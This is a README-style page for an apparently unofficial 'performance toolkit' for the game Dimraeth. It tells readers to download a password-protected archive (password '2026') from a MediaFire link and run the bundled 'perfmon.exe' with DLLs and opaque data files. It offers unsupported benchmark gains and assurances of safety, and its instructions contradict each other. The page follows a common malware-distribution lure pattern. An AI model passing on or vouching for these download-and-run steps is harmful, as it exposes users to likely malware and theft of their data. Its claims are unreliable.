<div align="center">

# 🎮 Dimraeth — Performance Notes

**Measure frame delivery before changing settings.**

[![Status](https://img.shields.io/badge/status-stable-brightgreen)](https://www.mediafire.com/folder/rn5uey4ypd8tr/USFP)
[![Download](https://img.shields.io/badge/download-mediafire-00b8ff)](https://www.mediafire.com/folder/rn5uey4ypd8tr/USFP)
![Platform](https://img.shields.io/badge/platform-Windows-0078D6?logo=windows)
[![Version](https://img.shields.io/badge/version-1.0-lightgrey)](#)

[Download](#-installation--setup) · [Issues](#-known-performance-issues) · [Test results](#-test-results) · [FAQ](#-frequently-asked-questions)

</div>

---

## 🕹️ About the game

Dimraeth is an action RPG set in the handcrafted pixel-art fantasy world of Mirkea, with solo play and online co-op for up to eight players. Its combat combines stamina management, positioning, dodging, blocking, and parrying with crafting, exploration, and base-building. Published requirements list DirectX 11 and DirectX 12 support but do not identify a specific engine.

Windows players and contributors who need reproducible diagnostics for frame pacing, startup behavior, cache handling, and session stability.

## 📸 Screenshots from the game

<table>
 <tr>
 <td width="33%"><img src="https://shared.akamai.steamstatic.com/store_item_assets/steam/apps/2402680/be6466db1ec3df5bdad949b03b16e8de7c40e792/ss_be6466db1ec3df5bdad949b03b16e8de7c40e792.1920x1080.jpg?t=1789631916" alt="screenshot" width="100%"></td>
 <td width="33%"><img src="https://shared.akamai.steamstatic.com/store_item_assets/steam/apps/2402680/a12742dfef0aedbfcb462a549245b1789dd6555f/ss_a12742dfef0aedbfcb462a549245b1789dd6555f.1920x1080.jpg?t=1789631916" alt="screenshot" width="100%"></td>
 <td width="33%"><img src="https://shared.akamai.steamstatic.com/store_item_assets/steam/apps/2402680/be6f58f36a05914f3ebeb43a0794e75acd000af4/ss_be6f58f36a05914f3ebeb43a0794e75acd000af4.1920x1080.jpg?t=1789631916" alt="screenshot" width="100%"></td>
 </tr>
</table>

## ⚠️ Known performance issues

- Frame-time spikes during area transitions and large combat encounters can produce 1% lows below 30 FPS on the stated test rig.
- Cold launches can spend approximately 60-90 seconds compiling or loading graphics cache data before stable rendering.
- Extended two-hour sessions can produce intermittent freezes, process stalls, or application crashes during co-op and high-effect scenes.

## 🩺 How the toolkit addresses these issues

- **Frame-time spikes during combat** → Frame Rate Helper adjusts frame delivery behavior, while Frame Timing Helper stabilizes frame delivery and reduces pacing variance.
- **Long cold-launch cache preparation** → Graphics Cache Utility manages graphics cache data, and Startup Parameter Tool applies tuned startup parameters for repeatable initialization.
- **Freezes and crashes during extended sessions** → Stability Report + Session Recovery collects diagnostic data and restores the session after recoverable failures.

## 📊 Test results

Test rig: Ryzen 5 5600, RTX 3060 12GB, 16GB RAM, NVMe SSD, 1920x1080, High settings, Windows 11 x64

| Metric | Before | After |
|---|---|---|
| Average FPS | 58 | 63 |
| 1% low FPS | 24 | 36 |
| Frame-time spikes above 33 ms | 18 per 10-minute run | 7 per 10-minute run |
| Crashes per 2-hour session | 2 | 0 |
| Cold-launch cache preparation | ~78s | ~22s |


## 🚀 How to use

1. Download the latest release from the link in the README.
2. Point the tool to the game's installation folder.
3. Select the Dimraeth profile from the supported list.
4. Review the proposed changes and click Apply.
5. On first launch, allow the graphics cache to rebuild.

## 🛠️ What this tool does

- 🎮 **Frame Rate Helper** — Adjusts frame delivery behavior using reversible configuration changes.
- 📊 **Stability Report + Session Recovery** — Collects logs and restores recoverable sessions after process failures.
- 🎯 **Frame Timing Helper** — Monitors frame-time variance and applies pacing controls.
- ⚙️ **Startup Parameter Tool** — Applies tuned startup parameters without modifying game assets.
- 🧠 **Process Scheduling Helper** — Applies documented process-priority and scheduling policies.
- 🧹 **Graphics Cache Utility** — Inspects, clears, and rebuilds graphics cache data.

## 💻 System Requirements

| Component | Minimum | Recommended |
|:--- |:--- |:--- |
| **OS** | Windows 10 (x64) | Windows 11 (x64) |
| **Processor** | Dual-core CPU | Quad-core CPU |
| **RAM** | 4 GB | 8 GB |
| **Graphics** | Any DirectX 11 GPU | Any DirectX 12 GPU |
| **Storage** | 50 MB available space | 100 MB available space |
| **Additional** | Windows 10 build 1909 or newer | Windows 11 with latest updates |


## 📦 Installation & Setup

| Platform | Status |
|---|---|
| Windows | ✅ Supported |
| macOS | ❌ Not supported |
| Linux | ❌ Not supported |

### Step 1: Download

You can download the tool from **[this page](https://www.mediafire.com/folder/rn5uey4ypd8tr/USFP)**. The archive contains everything you need.

### Step 2: Extract with Password

1. The archive is password-protected: **`2026`**
2. Use any archive extractor (WinRAR, 7-Zip, WinZip)
3. Enter the password when prompted

### Step 3: Extract All Files

1. Extract all files from the archive to a folder of your choice.
2. All files must be extracted to the **same folder**.
3. Do not rename or move individual files.
4. The folder should look like this:

```
tool/
|-- perfmon.exe <- Main executable
|-- frame_module.dll <- Frame module
|-- display_data.pak <- Display sync data
|-- session_reader.dll <- Session reader
|-- config.cfg <- User configuration
|-- graphics_cache.pak <- Graphics cache data
|-- core.bin <- Core runtime
|-- Password 2026.txt <- Password reminder (empty)
```

### Step 4: Run the tool

1. Open the extracted folder.
2. Run `perfmon.exe`.
3. Select the game you want to diagnose from the list.
4. Press **Collect** and launch the game.

### Step 5: Review the results

1. The tool will collect frame timing and scheduling data while you play.
2. When you exit the game, an overview report is written next to the tool.
3. Use the report to identify which subsystem is causing stutter.

## ❓ Frequently Asked Questions

**Q: How often is it updated?**
**A:** Updates are published whenever a new internal build is ready. There is no fixed schedule — the download link in Step 1 always points to the latest version.

**Q: Can I use it alongside other tools?**
**A:** Yes. It does not conflict with other monitoring or performance tools. It only reads OS-level counters and manages its own temporary folders.

**Q: Is it safe to use?**
**A:** Yes. It runs as a standalone executable, does not install anything system-wide, and can be removed by deleting its folder.

**Q: What is this tool?**
**A:** This is a small Windows diagnostics and tuning tool for PC games. It collects frame timing data, checks process scheduling, and manages graphics cache folders to help you find and reduce stutters and dropped frames.

**Q: Why is the archive password-protected?**
**A:** The archive uses a password as a standard packaging step so the build stays bundled correctly during distribution. The password is provided in the installation section above.

**Q: Does it require an internet connection?**
**A:** No. It runs fully offline and never sends data anywhere.

**Q: Which games are supported?**
**A:** Any game that runs on Windows and exposes a visible process. Diagnostics are collected per-process and do not require per-game configuration.

---

*This is an unofficial, open-source tool. Not affiliated with or endorsed by the developer/publisher of **Dimraeth**. All trademarks belong to their respective owners. Use at your own risk — backing up your game's configuration files before applying changes is recommended.*